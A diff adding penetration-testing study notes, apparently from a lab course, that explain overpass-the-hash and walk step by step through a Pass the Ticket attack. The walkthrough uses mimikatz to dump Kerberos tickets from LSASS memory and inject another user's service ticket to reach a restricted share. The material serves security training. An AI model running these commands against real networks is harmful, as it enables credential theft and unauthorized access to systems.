@@ -510,7 +510,40 @@ cd C:\tools\SysinternalsSuite\
 
 **As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command shell on the files04 server. Excellent! We have successfully upgraded a cached NTLM password hash to a Kerberos TGT to gain remote code execution on behalf of another user.**
 
+We used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.
+
 ## Pass the Ticket
+The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.
+
+In this scenario, we are going to abuse an already existing session of dave. The dave user has privileged access to the backup folder located on WEB04 where our logged in user jen does not. To demonstrate the attack angle, we are going to extract all the current TGT/TGS in memory and inject dave's WEB04 TGS into our own session. This will allow us to access the restricted folder.
+- Let's first log in as jen to CLIENT76 and verify that we are unable to access the resource on WEB04. To do so, we'll try to list the content of the \\web04\backup folder from an administrative PowerShell command line session.
+```
+whoami
+ls \\web04\backup
+```
+- Confirming that jen has no access to the restricted folder, we can now launch mimikatz, enable debug privileges, and export all the TGT/TGS from memory with the sekurlsa::tickets /export command.
+```
+privilege::debug
+```
+```
+sekurlsa::tickets /export
+```
+The above command parsed the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format. Because inspecting the generated tickets indicates that dave had initiated a session, we can try to inject one of their tickets inside jen's sessions. We can verify newly generated tickets with dir, filtering out on the kirbi extension.
+```
+dir *.kirbi
+```
+- As many tickets have been generated, we can just pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.
+```
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+```
+- No errors have been thrown, meaning that we should expect the ticket in our session when running klist.
+```
+klist
+```
+- We notice that the dave ticket has been successfully imported in our own session for the jen user. Let's confirm we have been granted access to the restricted shared folder.
+```
+ls \\web04\backup
+```
 
 ## DCOM
 
